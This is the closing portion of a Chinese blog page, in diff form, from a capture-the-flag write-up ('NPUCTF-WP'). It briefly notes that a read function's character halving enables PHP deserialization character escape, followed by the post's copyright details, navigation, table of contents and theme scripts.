+                     data-src="https://img-blog.csdnimg.cn/20200426131435346.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>那么我们的大致思路就有了。利用read函数把6个字符减半的特点。</p>
+<p>我们可以实现反序列化字符逃逸。</p>
+<p>真的牛逼。服气了，我当时根本没有理会那两个函数。。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">NPUCTF-WP</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">liduoan.efls</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2020-04-24 17:06:51</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2020/04/24/四月/NPUCTF-WP/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2020/04/26/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-01-week/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">leetcode_01_part</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2020/04/19/CTFcomig/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E4%B8%93%E9%A2%98/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">文件上传-专题</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NPUCTF-4-18-4-21"><span class="nav-number">1.</span> <span class="nav-text">NPUCTF   4.18-4.21</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E6%9F%A5%E6%BA%90%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">审查源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NPUCTF2020-ReadlezPHP"><span class="nav-number">1.2.</span> <span class="nav-text">[NPUCTF2020]ReadlezPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.2.1.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezinclude"><span class="nav-number">1.3.</span> <span class="nav-text">ezinclude</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E6%81%92%E7%9A%84-Ezunserialize"><span class="nav-number">2.</span> <span class="nav-text">安恒的 Ezunserialize</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8d"><span class="nav-number">2.1.</span> <span class="nav-text">字符逃逸d</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">liduoan.efls</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
